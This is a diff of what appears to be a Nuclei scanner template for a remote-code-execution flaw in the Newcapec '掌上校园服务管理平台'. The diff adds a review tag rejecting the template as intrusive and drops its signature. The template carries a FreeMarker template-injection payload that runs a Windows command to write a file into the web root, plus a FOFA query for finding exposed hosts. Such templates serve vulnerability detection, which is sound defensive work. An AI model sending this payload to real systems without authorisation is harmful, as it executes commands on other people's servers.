@@ -9,6 +9,7 @@ info:
   reference:
     - https://forum.butian.net/article/242
   metadata:
+    runzero-review: REJECT/2025-11-07/excluding tag intrusive
     max-request: 2
     fofa-query: title="掌上校园服务管理平台"
   tags: newcapec,rce,intrusive,vuln
@@ -26,7 +27,6 @@ http:
         Content-Type: application/json
 
         {"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo {{data}} > ./webapps/ROOT/{{file}}.txt\")}"}
-
       - |
         GET /{{file}}.txt HTTP/1.1
         Host: {{Hostname}}
@@ -40,4 +40,4 @@ http:
           - 'contains(body_1, "{\"_result\":")'
           - 'contains(body_2, "{{data}}")'
         condition: and
-# digest: 4b0a00483046022100ee87d2a68cd5a9a6b5fa0139e2a35606c7fcba93b8224745c4ad5f6fdcc8c0ff022100aba5ec819e86125b59b7399cf4dd55457046234a0cf5464b287bfaa617a04ab1:922c64590222798bb761d5b6d8e72950
+
